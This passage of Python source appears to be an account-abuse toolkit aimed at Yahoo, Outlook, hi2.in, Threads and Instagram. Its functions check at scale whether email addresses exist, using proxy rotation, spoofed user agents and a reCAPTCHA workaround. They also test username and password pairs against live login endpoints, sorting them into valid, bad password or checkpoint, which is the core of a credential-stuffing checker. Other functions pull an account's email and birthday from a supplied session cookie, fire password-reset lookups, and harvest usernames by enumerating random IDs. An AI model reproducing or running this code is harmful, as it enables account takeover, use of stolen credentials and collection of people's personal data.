                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
                ]),
            })
            proxy = Proxy.build(proxies)
            session.get(
                'https://login.yahoo.com/',
                params={'src': 'ym', 'done': 'https://mail.yahoo.com/'},
                proxies=proxy
            )
            params = {
                'lang': random.choice(['en-AU', 'en-US', 'en-GB']),
                'src': 'ym',
                'done': 'https://mail.yahoo.com/',
                'specId': 'yidregsimplified',
            }
            create_page = session.get(
                'https://login.yahoo.com/account/create',
                params=params,
                headers={'referer': 'https://login.yahoo.com/'},
                proxies=proxy
            )
            page_html = create_page.text
            crumb_match = re.search(r'crumb"\s*:\s*"([^"]+)"', page_html)
            if crumb_match:crumb = crumb_match.group(1)
            else:
                crumb_match = re.search(r'name="crumb"\s+value="([^"]+)"', page_html)
                if crumb_match:crumb = crumb_match.group(1)
                else:return {"status": "error", "msg": "crumb not found", "username": username, "Dev": Dev}
            acrumb = None
            for cookie in session.cookies:
                if cookie.name in ['A1', 'A3']:
                    acrumb_match = re.search(r's=([^&]+)', cookie.value)
                    if acrumb_match:
                        acrumb = acrumb_match.group(1)
                        break
            if not acrumb:
                acrumb_match = re.search(r'acrumb"\s*:\s*"([^"]+)"', page_html)
                if acrumb_match:acrumb = acrumb_match.group(1)
                else:acrumb = session.cookies.get('A1', '').split('s=')[-1].split('&')[0] if 'A1' in session.cookies else ''
            if not acrumb:return {"status": "error", "msg": "acrumb not found", "username": username, "Dev": Dev}
            session_index_match = re.search(r'sessionIndex"\s*:\s*"([^"]+)"', page_html)
            if session_index_match:session_index = session_index_match.group(1)
            else:session_index = "Qg--"
            data = {
                'browser-fp-data': browser_fp_encoded,
                'sessionIndex': session_index,
                'acrumb': acrumb,
                'crumb': crumb,
                'specId': 'yidregsimplified',
                'context': 'REGISTRATION',
                'done': '',
                'googleIdToken': '',
                'authCode': '',
                'attrSetIndex': '0',
                'tos0': 'oath_freereg|xa|en-JO',
                'firstName': 'Amna',
                'lastName': 'Malkawi',
                'yidDomain': 'yahoo.com',
                'userId': username,
                'password': 'kjbkhbkhv@09',
                'mm': '05',
                'dd': '09',
                'yyyy': '2000',
            }
            response = session.post(
                'https://login.yahoo.com/account/create/validate',
                params=params,
                data=data,
                headers={
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://login.yahoo.com',
                    'referer': f'https://login.yahoo.com/account/create?lang={params["lang"]}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2F&specId=yidregsimplified',
                    'x-requested-with': 'XMLHttpRequest',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                },
                proxies=proxy,
                timeout=30
            )
            try:response_json = response.json()
            except:return {"status": "error", "msg": "invalid json response", "username": username, "Dev": Dev}
            fields = response_json.get('fields', {})
            user_field = fields.get('userId', {})
            error = user_field.get('error', {})
            if error.get('id') == 'IDENTIFIER_NOT_AVAILABLE':return {"status": "taken", "username": username, "Dev": Dev}
            else:return {"status": "available", "username": username, "Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "username": username, "Dev": Dev}
    def __init__(self):self.session=None
    def hi2(self,email,proxy=None):
        try:
            self.session=requests.Session()
            p=Proxy.build(proxy)
            if p:self.session.proxies=p
            siteKey='6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct';siteUrl='https://hi2.in/';ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
            html=self.session.get(siteUrl).text
            try:renderUrl=re.findall(r"""'"['"]""",html)[0]
            except:renderUrl='https://www.google.com/recaptcha/api2/recaptcha__en.js'
            js=self.session.get(renderUrl).text
            m=re.search(r"po.src\s*=\s*'(https://[^']+)';",js)
            if m:v=m.group(1).split('/')[5];api=renderUrl.split('.js')[0];api=api+'2' if 'api2' not in api and 'enterprise' not in api else api
            else:v=renderUrl.split('/')[5];api='https://www.google.com/recaptcha/api2'
            site=self.session.get('https://www.google.com');cookies=site.cookies
            h={"accept":"/","accept-language":"en-US,en;q=0.9","origin":"https://www.google.com","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","user-agent":ua}
            domain=siteUrl.split('/')[2];co=base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=','.')
            anchor=self.session.get(f'{api}/anchor',params={'ar':'1','k':siteKey,'co':co,'hl':'en','v':v,'size':'invisible','cb':'abc123'},headers={**h,'referer':siteUrl},cookies=cookies).text
            token=anchor.split('recaptcha-token" value="')[1].split('"')[0]
            reload=self.session.post(f'{api}/reload?k={siteKey}',data={'v':v,'co':co,'reason':'q','size':'invisible','hl':'en','k':siteKey,'c':token,'chr':'','vh':'','bg':''},headers=h,cookies=cookies).text
            final=reload.split('"rresp","')[1].split('"')[0]
            prefix,domin=email.split('@')
            h2={'accept':'application/json, text/plain, */*','content-type':'application/x-www-form-urlencoded','origin':'https://hi2.in','referer':'https://hi2.in/','user-agent':ua}
            r=self.session.post('https://hi2.in/api/custom',headers=h2,data={'domain':domin,'prefix':prefix,'recaptcha':final})
            t=r.text.lower()
            if "just a moment" in t:return {"status":"blocked","message":"cloudflare block","email":email,"Dev":"Odai @K33K1"}
            elif "hash" in t:return {"status":"available","email":email,"Dev":"Odai @K33K1"}
            elif "address already taken" in t:return {"status":"taken","email":email,"Dev":"Odai @K33K1"}
            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33K1"}
        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33K1"}
    @staticmethod
    def outlook(email, proxies=None):
        proxy = proxies if proxies else None
        if not hasattr(checkems.outlook, "mc"):
            checkems.outlook.mc = None
            checkems.outlook.ca = None
        def get_token():
            try:
                r = requests.get(
                    'https://signup.live.com/signup',
                    headers={'accept': 'text/html', 'user-agent': generate_user_agent()},
                    timeout=10,
                    proxies = Proxy.build(proxies)
                )
                canary = str.encode(r.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape")
                mc = r.cookies.get('amsc')
                if not mc:
                    return None, None
                r = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies={'amsc': mc},
                    headers={
                        'accept': 'application/json',
                        'canary': canary,
                        'content-type': 'application/json',
                        'origin': 'https://signup.live.com',
                        'referer': 'https://signup.live.com/',
                        'user-agent': generate_user_agent()
                    },
                    json={
                        'clientExperiments': [{
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': ['enableplaintextforsignupexperiment_treatment'],
                        }]
                    },
                    timeout=10,
                    proxies = Proxy.build(proxies)
                ).json()

                ca = r.get('apiCanary')
                if ca:
                    return mc, ca
            except:
                pass
            return None, None

        if not checkems.outlook.mc or not checkems.outlook.ca:
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            if not checkems.outlook.mc or not checkems.outlook.ca:
                return {"status": "token failed"}

        try:
            r = requests.post(
                'https://signup.live.com/API/CheckAvailableSigninNames',
                params={
                    'mkt': 'AR-AR',
                    'lic': '1',
                    'uaid': str(uuid.uuid4())
                },
                cookies={
                    'mkt': 'ar-YE',
                    'MicrosoftApplicationsTelemetryDeviceId': str(uuid.uuid4()),
                    'MUID': token_hex(16),
                    'amsc': checkems.outlook.mc
                },
                headers={
                    'accept': 'application/json',
                    'canary': checkems.outlook.ca,
                    'content-type': 'application/json',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/signup',
                    'user-agent': generate_user_agent(),
                    'x-ms-apiversion': '2'
                },
                json={
                    'signInName': email,
                    'includeSuggestions': True
                },
                timeout=10,
                proxies = Proxy.build(proxies)
            ).text

            if '"isAvailable":true' in r:
                return {"status": "available", "email": email, "Dev": "Odai @K33K1"}
            if '"isAvailable":false' in r:
                return {"status": "taken", "email": email, "Dev": "Odai @K33K1"}
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            return {"status": "error", "response": "unknown", "Dev": "Odai @K33K1"}
        except Exception as e:
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            return {"status": "error", "error": str(e), "Dev": "Odai @K33K1"}
class threads:
    @staticmethod
    def login(user, password, proxies=None):
        Dev = "Odai @K33K1"
        if not user or not password:return {"status": "invalid input","user": user,"password": password,"Dev": Dev}
        payload = {'can_threads_signup_with_ig': "false",'enc_password': f"#PWD_BROWSER:0:{str(int(time.time()))}:{password}",'optIntoOneTap': "false",'queryParams': "{}",'stopDeletionNonce': "","textAppStopDeletionToken": "","username": user}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",'x-instagram-ajax': "0",'x-ig-app-id': "1412234116260832",'x-asbd-id': "359341",'x-bloks-version-id': "86eaac606b7c5e9b45f4357f86082d05eace8411e43d3f754d885bf54a759a71",'sec-ch-prefers-color-scheme': "light",'sec-ch-ua-platform-version': "\"16.0.0\"",'origin': "https://www.threads.com",'sec-fetch-site': "same-origin",'sec-fetch-mode': "cors",'sec-fetch-dest': "empty",'referer': "https://www.threads.com/login/",'accept-language': "en-US"}
        try:
            client = httpx.Client(http2=True, proxies = Proxy.build(proxies), timeout=15)
            pre = client.get("https://www.threads.com/login/")
            csrftoken = client.cookies.get("csrftoken", "")
            headers['x-csrftoken'] = csrftoken
            response = client.post("https://www.threads.com/api/v1/web/accounts/login/ajax/", data=payload, headers=headers)
            text = response.text
            if '"authenticated":true' in text:return {"status": "success","user": user,"password": password,"cookies": dict(client.cookies),"Dev": Dev}
            elif '"error_type":"UserInvalidCredentials"' in text or '"user":true,"authenticated":false' in text:return {"status": "bad password","user": user,"password": password,"Dev": Dev}
            elif 'checkpoint_required' in text or 'checkpoint_url' in text or 'challenge' in text or 'two_factor' in text:
                return {"status": "checkpoint","user": user,"password": password,"Dev": Dev}
            elif '"user":true' in text and '"authenticated":false' in text:return {"status": "bad password","user": user,"password": password,"Dev": Dev}
            elif '"status":"fail"' in text and 'CSRF' in text:return {"status": "csrf failed","user": user,"password": password,"Dev": Dev}
            else:return {"status": "unknown response","user": user,"password": password,"Dev": Dev}
        except Exception as e:return {"status": "error","error": str(e),"user": user,"password": password,"Dev": Dev}
    @staticmethod
    def info(username, proxies=None):
        Dev = "Odai @K33K1"
        if not username:return {"status": "invalid input","Dev": Dev}
        try:
            cookies = {'csrftoken': '','ig_did': '','dpr': '2.737499952316284','mid': ''}
            headers = {'authority': 'www.threads.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,ar;q=0.8','cache-control': 'max-age=0','dpr': '2.737499952316284','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"','sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"2201117PG"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"13.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36','viewport-width': '980'}
            url = f"https://www.threads.com/@{username}"
            res = requests.get(url, cookies=cookies, headers=headers, proxies = Proxy.build(proxies))
            html = res.text
            if 'Sorry, this page isn\'t available' in html or res.status_code == 404:return {"status": "user not found","user": username,"Dev": Dev}
            soup = BeautifulSoup(html, 'html.parser')
            profile_data = {}
            title_tag = soup.find('title')
            if title_tag:
                title_text = title_tag.get_text()
                match = re.search(r'\(@([^)]+)\)', title_text)
                if match: profile_data['username'] = match.group(1)
                name_match = re.match(r'^([^(]+)', title_text)
                if name_match: profile_data['name'] = name_match.group(1).strip()
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            if meta_desc and meta_desc.get('content'):
                desc = meta_desc['content']
                followers_match = re.search(r'([\d\.]+[KMB]?)\s*Followers', desc, re.IGNORECASE)
                threads_match = re.search(r'([\d\.]+[KMB]?)\s*Threads', desc, re.IGNORECASE)
                if followers_match: profile_data['followers'] = followers_match.group(1)
                if threads_match: profile_data['threads'] = threads_match.group(1)
                bio_part = desc.split('•')[-1].strip()
                if bio_part: profile_data['bio'] = bio_part
            og_image = soup.find('meta', attrs={'property': 'og:image'})
            if og_image and og_image.get('content'):
                profile_data['avatar'] = og_image['content']
            posts = []
            containers = soup.find_all('div', attrs={'data-pagelet': re.compile(r'threads_profile_posts_timeline')})
            for container in containers:
                spans = container.find_all('span', class_=re.compile(r'x1lliihq'))
                for span in spans:
                    text = span.get_text(strip=True)
                    if text and len(text) > 20:
                        link_tag = container.find('a', href=re.compile(r'l\.threads\.com'))
                        link = link_tag['href'] if link_tag else None
                        time_tag = container.find('time')
                        time_txt = time_tag.get_text(strip=True) if time_tag else None
                        posts.append({'text': text,'link': link,'time': time_txt})
                        break
            profile_data['posts'] = posts[:10]
            scripts = soup.find_all('script', type='application/json')
            for script in scripts:
                if script.string:
                    try:
                        data = json.loads(script.string)
                        if isinstance(data, dict) and 'user' in data:
                            user = data['user']
                            if 'username' in user: profile_data['username'] = user['username']
                            if 'full_name' in user: profile_data['name'] = user['full_name']
                            if 'follower_count' in user: profile_data['followers'] = str(user['follower_count'])
                            if 'biography' in user: profile_data['bio'] = user['biography']
                            if 'profile_pic_url' in user: profile_data['avatar'] = user['profile_pic_url']
                    except: pass
            return {"status": "success","user": username,"data": profile_data,"Dev": Dev}
        except Exception as e:
            return {"status": "error","error": str(e),"user": username,"Dev": Dev}
class instagram:
    @staticmethod
    def login(username, password, proxies=None):
        def instaagent():
            android_versions=[("29","10"),("30","11"),("31","12"),("32","12L"),("33","13"),("34","14")];devices=[("Xiaomi","Redmi","Redmi Note 8 Pro","begonia","mt6785","1080x2220","440"),("Xiaomi","Redmi","Redmi Note 10","mojito","sm6150","1080x2400","440"),("Xiaomi","POCO","POCO X3","surya","sm7150","1080x2400","440"),("samsung","Samsung","SM-A515F","a51","exynos9611","1080x2400","420"),("samsung","Samsung","SM-G991B","o1s","exynos2100","1080x2400","450"),("HUAWEI","Huawei","P30 Pro","VOG-L29","kirin980","1080x2340","440"),("OPPO","Oppo","CPH2065","reno4","sm7125","1080x2400","440")];locales=["en_US","ar_EG","ar_SA","fr_FR","es_ES"];ig_versions=["237.0.0.14.102","238.0.0.17.107","239.0.0.18.109","240.1.0.16.110"];android_api,android_release=random.choice(android_versions);brand,manufacturer,model,device,cpu,resolution,dpi=random.choice(devices)
            return f"Instagram {random.choice(ig_versions)} Android ({android_api}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {device}; {cpu}; {random.choice(locales)}; {random.randint(300000000,399999999)})"
        try:
            headers={'User-Agent':instaagent(),'x-bloks-version-id':"8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",'x-ig-app-id':"567067343352427",'priority':"u=3",'accept-language':"ar-EG, en-US"}
            data={'signed_body':f'SIGNATURE.{{"enc_password":"#PWD_INSTAGRAM:0:{int(time.time())}:{password}","username":"{username}","adid":"","guid":"{uuid4()}","device_id":"android-{str(uuid4())[:16]}","google_tokens":"[]","login_attempt_count":"0"}}'}
            r=requests.post("https://i.instagram.com/api/v1/accounts/login/",data=data,headers=headers,proxies = Proxy.build(proxies));text=r.text
            try:js=r.json()
            except:js={}
            if '"authenticated":true' in text or 'logged_in_user' in text:return {"status":"success","user":username,"password":password,"Dev":"Odai @K33K1"}
            error_type=js.get("error_type","")
            if error_type=="bad_password":return {"status":"bad password","user":username,"password":password,"Dev":"Odai @K33K1"}
            elif error_type=="invalid_user":return {"status":"user not found","user":username,"password":password,"Dev":"Odai @K33K1"}
            elif error_type in ["two_factor_required","challenge_required"]:return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33K1"}
            elif error_type=="checkpoint_challenge_required":return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33K1"}
            elif error_type=="missing_parameters":return {"status":"missing parameters","user":username,"password":password,"Dev":"Odai @K33K1"}
            elif error_type=="unexpected_login_error":return {"status":"error login","user":username,"password":password,"Dev":"Odai @K33K1"}
            else:return {"status":"unknown response","user":username,"password":password,"Dev":"Odai @K33K1"}
        except Exception as e:return {"status":"error","error":str(e),"user":username,"password":password,"Dev":"Odai @K33K1"}
    #@staticmethod
    def reset(self, search_query, proxy=None):
        self.session = requests.Session()
        PROXIES = Proxy.build(proxy) if proxy else None
        main_page = self.session.get('https://www.instagram.com/accounts/login/')
        csrftoken = self.session.cookies.get('csrftoken')
        mid = self.session.cookies.get('mid')
        ig_did = self.session.cookies.get('ig_did')
        datr = self.session.cookies.get('datr')
        ig_nrcb = self.session.cookies.get('ig_nrcb')
        rur = self.session.cookies.get('rur')
        page_text = main_page.text
        lsd = ''
        if '"LSD"' in page_text:
            lsd_match = re.search(r'"LSD",\[\],{"token":"([^"]+)"}', page_text)
            if lsd_match:lsd = lsd_match.group(1)
        app_id = ''
        app_id_match = re.search(r'"APP_ID":"(\d+)"', page_text)
        if app_id_match:app_id = app_id_match.group(1)
        else:app_id = '936619743392459'
        asbd_id = ''
        asbd_match = re.search(r'"ASBD_ID":"(\d+)"', page_text)
        if asbd_match:asbd_id = asbd_match.group(1)
        else:asbd_id = '359341'
        rollout_hash = ''
        hash_match = re.search(r'"rollout_hash":"([^"]+)"', page_text)
        if hash_match:rollout_hash = hash_match.group(1)
        cookies = {'datr': datr if datr else '','ig_did': ig_did if ig_did else '','ig_nrcb': ig_nrcb if ig_nrcb else '1','mid': mid if mid else '','csrftoken': csrftoken if csrftoken else '','rur': rur if rur else ''}
        headers={'accept':'*/*','accept-language':'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/accounts/password/reset/','sec-ch-prefers-color-scheme':'dark','sec-ch-ua':'"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"','sec-ch-ua-full-version-list':'"Google Chrome";v="147.0.7727.102", "Not.A/Brand";v="8.0.0.0", "Chromium";v="147.0.7727.102"','sec-ch-ua-mobile':'?0','sec-ch-ua-model':'""','sec-ch-ua-platform':'"Windows"','sec-ch-ua-platform-version':'"19.0.0"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-asbd-id':asbd_id,'x-csrftoken':csrftoken if csrftoken else '','x-fb-friendly-name':'CAAIGAccountSearchViewQuery','x-fb-lsd':lsd if lsd else '','x-ig-app-id':app_id,'x-ig-max-touch-points':'0'}
        event_request_id = str(uuid.uuid4())
        waterfall_id = str(uuid.uuid4())
        hsi = str(int(time.time() * 1000))[:19]
        data={'av':'0','__d':'www','__user':'0','__a':'1','__req':'8','__hs':'20565.HYP:instagram_web_pkg.2.1...0','dpr':'1','__ccg':'GOOD','__rev':'1037880602','__s':'dg2bnj:cwovcj:ist3mw','__hsi':hsi,'__comet_req':'7','lsd':lsd if lsd else '','jazoest':'22339','__spin_r':'1037880602','__spin_b':'trunk','__spin_t':str(int(time.time())),'__crn':'comet.igweb.PolarisCAAIGAccountRecoverySearchRoute','qpl_active_flow_ids':'516759801','fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CAAIGAccountSearchViewQuery','server_timestamps':'true','variables':json.dumps({"params":{"event_request_id":event_request_id,"next_uri":"","search_query":search_query,"waterfall_id":waterfall_id}}),'doc_id':'26178667145161478','fb_api_analytics_tags':'["qpl_active_flow_ids=516759801"]'}
        if PROXIES:
            response = self.session.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data,proxies=PROXIES)
            try:data_dict = json.loads(response.text)
            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33K1"}
        else:
            response = self.session.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data)
            try:data_dict = json.loads(response.text)
            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33K1"}
        result = {}
        try:
            caa = data_dict["data"]["caa_ar_ig_account_search"]
            profiles = caa.get("profiles", [])
            result['status'] = "success"
            if profiles:
                result["username"] = profiles[0].get("name")
                result["profile_pic"] = profiles[0].get("profile_pic_url")
            result["search_type"] = caa.get("search_type")
            contact_points = caa.get("contact_points", [])
            if contact_points:result["contact point"] = contact_points[0].get("contact_point")
            result["allow display"] = caa.get("allow_display")
            result["Dev"] = "Odai @K33K1"
        except Exception as e:result = {"status": "error","error": str(e),"email": search_query,"Dev": "Odai @K33K1"}
        if "@" in search_query:return {"status": "success","message": "email sent successfully","email": search_query,"Dev": "Odai @K33K1"}
        return result
    @staticmethod
    def date(iD):
        try:
            iD = int(iD)
            if 1 < iD <= 1278889:date = 2010
            elif 1279000 <= iD <= 17750000:date = 2011
            elif 17750001 <= iD <= 279760000:date = 2012
            elif 279760001 <= iD <= 900990000:date = 2013
            elif 900990001 <= iD <= 1629010000:date = 2014
            elif 1629010001 <= iD <= 2369359761:date = 2015
            elif 2369359762 <= iD <= 4239516754:date = 2016
            elif 4239516755 <= iD <= 6345108209:date = 2017
            elif 6345108210 <= iD <= 10016232395:date = 2018
            elif 10016232396 <= iD <= 27238602159:date = 2019
            elif 27238602160 <= iD <= 43464475395:date = 2020
            elif 43464475396 <= iD <= 50289297647:date = 2021
            elif 50289297648 <= iD <= 57464707082:date = 2022
            elif 57464707083 <= iD <= 63313426938:date = 2023
            elif 63313426939 <= iD <= 76593747273:date = 2024
            elif 76593747274 <= iD <= 80400988632:date = 2025
            elif iD >= 80400988633:date = 2026
            else:date = None
            return {"status": "success","iD": iD,"date": date,"Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error","error": str(e),"iD": iD,"Dev": "Odai @K33K1"}
    @staticmethod
    def info_s(sessionid, proxies=None):
        import requests, json
        Dev = "Odai @K33K1"
        if not sessionid:
            return {"status": "invalid input","sessionid": sessionid,"Dev": Dev}
        try:
            cookies = {'csrftoken': 'missing','mid': 'missing','datr': 'missing','ig_did': 'missing','wd': '988x872','dpr': '1.25','ps_l': '1','ps_n': '1','ds_user_id': '0','sessionid': sessionid,'rur': 'missing'}
            headers = {'accept': '*/*','accept-language': 'en-GB,en;q=0.9,ar-JO;q=0.8,ar;q=0.7,en-US;q=0.6','content-type': 'application/x-www-form-urlencoded','origin': 'https://accountscenter.instagram.com','priority': 'u=1, i','referer': 'https://accountscenter.instagram.com/?theme=dark&entry_point=app_settings','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"','sec-ch-ua-full-version-list': '"Chromium";v="146.0.7680.80", "Not-A.Brand";v="24.0.0.0", "Google Chrome";v="146.0.7680.80"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"19.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36','x-asbd-id': '359341','x-fb-friendly-name': 'FXAccountsCenterProfilesPageV2Query','x-fb-lsd': 'missing'}
            data = {'av': '17841400324458181','__user': '0','__a': '1','__req': 'y','__hs': '20530.HYP:accounts_center_pkg.2.1...0','dpr': '1','__ccg': 'GOOD','__rev': '1035370989','__s': 'd4pb9a:20ccs1:b7dvzk','__hsi': '7618384905762253501','__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1ow4-w','__sjsp': 'glh2YQ5Q6ct6E4416moSVEgw6vyxwG5j5aa5tM355lO8k8k8J0hXo','__comet_req': '24','fb_dtsg': 'missing','jazoest': '26351','lsd': 'missing','__spin_r': '1035370989','__spin_b': 'trunk','__spin_t': '1773793461','fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'FXAccountsCenterProfilesPageV2Query','server_timestamps': 'true','variables': '{"device_id":"device_id_fetch_ig_did","flow":"IG_WEB_SETTINGS","interface":"IG_WEB","platform":"INSTAGRAM","scale":1}','doc_id': '25777809238584450'}
            r = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies=cookies, headers=headers, data=data, proxies = Proxy.build(proxies))
            text = r.text
            try:
                js = json.loads(text)
            except:return {"status": "bad response","Dev": Dev}
            try:
                identity = js["data"]["fx_identity_management"]["identities_and_central_identities"]["linked_identities_to_pci"][0]
                username = identity.get("username")
                account_type = identity.get("detailed_identity_type")
                profile_picture = identity.get("profile_picture_info", {}).get("profile_picture_url")
                nodes = js["data"]["fxcal_settings"]["node"]["personal_info_section"]["nodes"]
                email = None
                birthday = None
                for node in nodes:
                    if node.get("__typename") == "XFBFXSettingsContactPoint": email = node.get("navigation_row_subtitle")
                    elif node.get("__typename") == "XFBFXSettingsBirthday": birthday = node.get("navigation_row_subtitle")
                return {"status": "success","username": username,"account_type": account_type,"profile_picture": profile_picture,"email": email,"birthday": birthday,"Dev": Dev}
            except Exception as e:
                return {"status": "parse error","error": str(e),"Dev": Dev}
        except Exception as e:return {"status": "error","error": str(e),"Dev": Dev}
    @staticmethod
    def search(proxies=None):
        import requests,random,secrets
        from faker import Faker
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        Dev = "Odai @K33K1"

        try:
            def k():
                s=requests.Session()
                r=Retry(total=2,backoff_factor=0.1,status_forcelist=[500,502,503,504])
                a=HTTPAdapter(pool_connections=100,pool_maxsize=100,max_retries=r)
                s.mount('https://',a);s.mount('http://',a)
                return s

            def l():
                y=random.choice([2012,2013])
                z={2012:(17750001,279760000),2013:(279760001,900990000)}
                return str(random.randint(*z[y]))

            s=k()
            f=Faker()
            results=[]

            while len(results) < 5:
                try:
                    p=l()
                    q=secrets.token_hex(32)
                    r=secrets.token_hex(27)
                    t=secrets.token_hex(36)
                    u=secrets.token_hex(24)
                    v=f.user_agent()
                    w=''.join(random.choice('936619743392459')for _ in range(15))

                    cookies={'csrftoken':q,'ps_l':'0','ps_n':'0','ig_did':t,'ig_nrcb':'1','dpr':'2','mid':r,'datr':u}
                    headers={'user-agent':v,'viewport-width':'891','x-asbd-id':'129477','x-csrftoken':q,'x-fb-friendly-name':'PolarisProfilePageContentQuery','x-fb-lsd':'AVoRhvRPoRs','x-ig-app-id':w}
                    data={'lsd':'AVoRhvRPoRs','variables':f'{{"id":"{p}","relay_header":false,"render_surface":"PROFILE"}}','server_timestamps':'true','doc_id':'7381344031985950'}

                    res=s.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data,timeout=3,proxies = Proxy.build(proxies))
                    js=res.json()

                    if 'data' in js and js['data'] and 'user' in js['data']:
                        username=js['data']['user'].get("username")
                        if username and username not in results:
                            results.append(username)

                except:
                    continue

            return {"status": "success","users": results,"Dev": Dev}

        except Exception as e:
            return {"status": "error","error": str(e),"Dev": Dev}
    @staticmethod
    def info(username, proxies=None):
        import requests
        Dev = "Odai @K33K1"
        if not username:return {"status": "invalid input","username": username,"Dev": Dev}
        try:
            r = requests.get(f'https://peekviewer.com/api/ig/{username}', proxies = Proxy.build(proxies))
            if r.status_code == 200:
                try:
                    response = r.json()
                    if response.get("status") == "success":
                        data = response.get("data", {})
                        return {
                            "status": "success",
                            "id": data.get("id"),
                            "full_name": data.get("fullName"),
                            "username": data.get("username"),
                            "posts": data.get("postsCount"),
                            "followers": data.get("followersCount"),
                            "following": data.get("followingCount"),
                            "private": data.get("isPrivate"),
                            "profile_pic": data.get("profilePicUrl"),
                            "Dev": Dev
                        }
                    else:
                        return {
                            "status": "failed",
                            "username": username,
                            "Dev": Dev
                        }
                except Exception as e:
                    return {
                        "status": "json error",
                        "error": str(e),
                        "username": username,
                        "Dev": Dev
                    }
            else:
                return {
                    "status": "http error",
                    "code": r.status_code,
                    "username": username,
                    "Dev": Dev
                }
        except Exception as e:
            return {
                "status": "request error",
                "error": str(e),
                "username": username,
                "Dev": Dev
            }
    @staticmethod
    def checkusername(username,proxies=None):
        import requests,re,random
        Dev = "Odai @K33K1"
        try:
            url = "https://www.instagram.com/"
            response = requests.get(url, proxies = Proxy.build(proxies))
            cookies_raw = response.headers.get('Set-Cookie', '')
            match = re.search(r"csrftoken=([^;]+)", cookies_raw)
            csrftoken = match.group(1) if match else None
            if not csrftoken:
                return {"status": "csrf error","Dev": Dev}
            cookies = {'csrftoken': csrftoken,'dpr': '2.625','mid': 'Zv58iAABAAFLa6BSzAgqXKb9GvK7','datr': 'iHz-Zn21Ji73yEkxXS5aDuzU','ig_did': '6A0F5B62-9C1F-4682-859D-61D83C2F0940','ig_nrcb': '1','wd': '412x414'}
